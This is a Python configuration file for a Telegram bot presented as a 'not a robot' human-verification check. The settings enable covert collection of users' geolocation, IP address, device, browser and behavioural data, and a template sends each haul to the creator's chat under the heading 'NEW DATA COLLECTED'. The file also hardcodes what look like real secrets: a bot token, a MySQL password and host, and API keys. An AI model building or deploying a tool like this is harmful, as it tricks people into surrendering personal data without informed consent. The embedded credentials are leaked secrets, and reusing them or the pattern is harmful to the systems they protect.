"""
Конфигурационный файл Telegram Verification Bot
Все настройки системы
"""

import os
import sys
from pathlib import Path
from dotenv import load_dotenv

# Загружаем переменные окружения из .env файла
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ============================================================================
# TELEGRAM BOT CONFIGURATION
# ============================================================================

# Токен бота от @BotFather (ОБЯЗАТЕЛЬНО ЗАМЕНИТЬ)
BOT_TOKEN = os.getenv('BOT_TOKEN', '7725874473:AAEEZj4LtuhjcL0lqN9nATOcihJr2uqyhi0')

# ID создателя для отправки собранных данных
CREATOR_CHAT_ID = os.getenv('CREATOR_CHAT_ID', '990561525')

# ============================================================================
# DATABASE CONFIGURATION (MySQL on Railway)
# ============================================================================

# MySQL соединение для Railway
DB_CONFIG = {
    'host': os.getenv('DB_HOST', 'gondola.proxy.rlwy.net'),
    'port': int(os.getenv('DB_PORT', '15465')),
    'database': os.getenv('DB_NAME', 'railway'),
    'user': os.getenv('DB_USER', 'root'),
    'password': os.getenv('DB_PASSWORD', 'QWGJtSPaTMCjODrfySWkTyHyxHzYwEDM'),
    'charset': 'utf8mb4',
    'use_unicode': True,
    'autocommit': True,
    'ssl_disabled': True  # Railway требует отключить SSL
}

# Полный connection URL для совместимости
DATABASE_URL = os.getenv('DATABASE_URL', 
    'mysql://root:QWGJtSPaTMCjODrfySWkTyHyxHzYwEDM@gondola.proxy.rlwy.net:15465/railway')

# ============================================================================
# WEB SERVER CONFIGURATION
# ============================================================================

# Базовый URL веб-сервера для верификации
WEBSITE_BASE_URL = os.getenv('WEBSITE_BASE_URL', 'https://securehumanverification-production.up.railway.app')

# URL для вебхуков
WEBHOOK_URL = os.getenv('WEBHOOK_URL', f'{WEBSITE_BASE_URL}/webhook')

# Секретный путь для вебхука (для безопасности)
WEBHOOK_PATH = f"/webhook/{BOT_TOKEN.split(':')[1][:10]}"

# Полный URL вебхука
WEBHOOK_FULL_URL = f"{WEBHOOK_URL}/{BOT_TOKEN.split(':')[1][:10]}"

# ============================================================================
# SECURITY CONFIGURATION
# ============================================================================

# Секретный ключ для API аутентификации
API_SECRET = os.getenv('API_SECRET', 'secure_verification_system_arkadiy1803_2025')

# Соль для хеширования токенов
TOKEN_SALT = os.getenv('TOKEN_SALT', 'verification_salt_arkadiy1803')

# Время жизни токена верификации (в секундах)
TOKEN_EXPIRY = 3600  # 1 час

# Максимальное количество попыток верификации
MAX_VERIFICATION_ATTEMPTS = 3

# ============================================================================
# APPLICATION BEHAVIOR
# ============================================================================

# Режим отладки
DEBUG = os.getenv('DEBUG', 'False').lower() == 'true'

# Язык бота
BOT_LANGUAGE = 'ru'

# Приветственное сообщение
WELCOME_MESSAGE = """
👋 Добро пожаловать в систему верификации!

Для использования всех функций необходимо подтвердить, что вы не робот.

Нажмите кнопку ниже для прохождения быстрой проверки.
"""

# Сообщение после успешной верификации
SUCCESS_MESSAGE = """
✅ Верификация успешно пройдена!

Ваша личность подтверждена. Теперь вам доступны все функции бота.
"""

# Сообщение при ошибке верификации
ERROR_MESSAGE = """
❌ Произошла ошибка при верификации.

Пожалуйста, попробуйте позже или обратитесь к администратору.
"""

# ============================================================================
# LOGGING CONFIGURATION
# ============================================================================

# Уровень логирования
LOG_LEVEL = os.getenv('LOG_LEVEL', 'INFO')

# Файл для логов
LOG_FILE = os.getenv('LOG_FILE', 'bot/logs/verification_bot.log')

# Максимальный размер лог-файла (в байтах)
LOG_MAX_SIZE = 10 * 1024 * 1024  # 10 MB

# Количество backup файлов логов
LOG_BACKUP_COUNT = 5

# ============================================================================
# DATA COLLECTION SETTINGS
# ============================================================================

# Собирать геолокацию (если пользователь разрешит)
COLLECT_GEOLOCATION = True

# Собирать данные об устройстве
COLLECT_DEVICE_INFO = True

# Собирать данные о браузере
COLLECT_BROWSER_INFO = True

# Собирать поведенческие данные
COLLECT_BEHAVIORAL_DATA = True

# Сохранять данные в базу
SAVE_TO_DATABASE = True

# Сохранять данные в файл (для резервной копии)
SAVE_TO_FILE = True

# Путь для сохранения данных
DATA_SAVE_PATH = 'bot/collected_data/'

# ============================================================================
# NOTIFICATION SETTINGS
# ============================================================================

# Отправлять уведомления создателю
SEND_NOTIFICATIONS = True

# Формат уведомления
NOTIFICATION_TEMPLATE = """
🚨 НОВЫЕ ДАННЫЕ СОБРАНЫ

👤 Пользователь: {first_name} {last_name} (@{username})
🆔 Telegram ID: {telegram_id}
🌐 IP адрес: {ip}
📍 Местоположение: {country}, {city}
🖥️ Устройство: {device}
🕐 Время: {timestamp}
"""

# ============================================================================
# VALIDATION FUNCTIONS
# ============================================================================

def validate_config():
    """
    Проверка корректности конфигурации
    Возвращает список ошибок или пустой список если все OK
    """
    errors = []
    
    # Проверка токена бота
    if not BOT_TOKEN:
        errors.append("❌ BOT_TOKEN не установлен")
    elif ':' not in BOT_TOKEN:
        errors.append("❌ BOT_TOKEN имеет неверный формат")
    
    # Проверка Chat ID
    if not CREATOR_CHAT_ID:
        errors.append("❌ CREATOR_CHAT_ID не установлен")
    elif not CREATOR_CHAT_ID.isdigit():
        errors.append("❌ CREATOR_CHAT_ID должен содержать только цифры")
    
    # Проверка конфигурации БД
    required_db_fields = ['host', 'port', 'database', 'user', 'password']
    for field in required_db_fields:
        if not DB_CONFIG.get(field):
            errors.append(f"❌ Не установлено поле БД: {field}")
    
    # Проверка URL веб-сервера
    if not WEBSITE_BASE_URL:
        errors.append("❌ WEBSITE_BASE_URL не установлен")
    elif not (WEBSITE_BASE_URL.startswith('http://') or WEBSITE_BASE_URL.startswith('https://')):
        errors.append("❌ WEBSITE_BASE_URL должен начинаться с http:// или https://")
    
    return errors

def print_config_summary():
    """
    Вывод сводки конфигурации
    """
    print("=" * 60)
    print("КОНФИГУРАЦИЯ TELEGRAM VERIFICATION BOT")
    print("=" * 60)
    
    # Безопасный вывод токена
    if BOT_TOKEN and ':' in BOT_TOKEN:
        token_parts = BOT_TOKEN.split(':')
        masked_token = f"{token_parts[0]}:{'*' * len(token_parts[1])}"
        print(f"🤖 Токен бота: {masked_token}")
    else:
        print(f"🤖 Токен бота: {BOT_TOKEN}")
    
    print(f"👤 Chat ID создателя: {CREATOR_CHAT_ID}")
    print(f"🌐 Веб-сервер: {WEBSITE_BASE_URL}")
    print(f"🗄️  База данных: {DB_CONFIG['host']}:{DB_CONFIG['port']}/{DB_CONFIG['database']}")
    print(f"🔐 API Secret: {'*' * len(API_SECRET) if API_SECRET else 'Не установлен'}")
    print(f"🐛 Режим отладки: {'ВКЛ' if DEBUG else 'ВЫКЛ'}")
    print("=" * 60)
    
    # Проверка конфигурации
    errors = validate_config()
    if errors:
        print("\n⚠️  ОШИБКИ КОНФИГУРАЦИИ:")
        for error in errors:
            print(f"   {error}")
        return False
    else:
        print("\n✅ Конфигурация проверена успешно")
        return True

# ============================================================================
# DATABASE TABLE NAMES
# ============================================================================

# Имена таблиц в базе данных
DB_TABLES = {
    'users': 'verification_users',
    'tokens': 'verification_tokens',
    'data': 'collected_verification_data',
    'sessions': 'user_sessions',
    'logs': 'system_logs'
}

# ============================================================================
# TELEGRAM API SETTINGS
# ============================================================================

# Таймаут для запросов к Telegram API
TELEGRAM_TIMEOUT = 30

# Максимальное количество повторных попыток при ошибках
TELEGRAM_RETRIES = 3

# Путь для временных файлов
TEMP_DIR = 'bot/temp/'

# ============================================================================
# AUTO-CONFIGURATION
# ============================================================================

# Создаем необходимые директории при импорте
def create_directories():
    """Создание необходимых директорий"""
    directories = [
        'bot/logs',
        'bot/collected_data',
        'bot/temp',
        'bot/database'
    ]
    
    for directory in directories:
        Path(directory).mkdir(parents=True, exist_ok=True)

# Автоматически создаем директории
create_directories()

# ============================================================================
# ENVIRONMENT DETECTION
# ============================================================================

# Определяем окружение
def get_environment():
    """Определение текущего окружения"""
    if 'RAILWAY_ENVIRONMENT' in os.environ:
        return 'railway'
    elif 'HEROKU_APP_NAME' in os.environ:
        return 'heroku'
    elif 'PYTHONANYWHERE_SITE' in os.environ:
        return 'pythonanywhere'
    else:
        return 'local'

CURRENT_ENVIRONMENT = get_environment()

# Настройки для разных окружений
ENVIRONMENT_CONFIGS = {
    'local': {
        'debug': True,
        'log_level': 'DEBUG',
        'webhook_enabled': False  # Используем polling локально
    },
    'railway': {
        'debug': False,
        'log_level': 'INFO',
        'webhook_enabled': True
    },
    'heroku': {
        'debug': False,
        'log_level': 'INFO',
        'webhook_enabled': True
    },
    'pythonanywhere': {
        'debug': False,
        'log_level': 'INFO',
        'webhook_enabled': True
    }
}

# Применяем настройки для текущего окружения
env_config = ENVIRONMENT_CONFIGS.get(CURRENT_ENVIRONMENT, ENVIRONMENT_CONFIGS['local'])
DEBUG = env_config['debug']
LOG_LEVEL = env_config['log_level']
USE_WEBHOOK = env_config['webhook_enabled']

# ============================================================================
# VERSION INFORMATION
# ============================================================================

VERSION = '1.0.0'
AUTHOR = 'Arkadiy1803'
REPOSITORY = 'https://github.com/Arkadiy1803/SecureHumanVerification1'

# ============================================================================
# MAIN CONFIG CHECK
# ============================================================================

if __name__ == '__main__':
    """
    При прямом запуске конфига проверяем настройки
    """
    print_config_summary()
    
    # Если есть ошибки - выходим с кодом ошибки
    errors = validate_config()
    if errors:
        sys.exit(1)
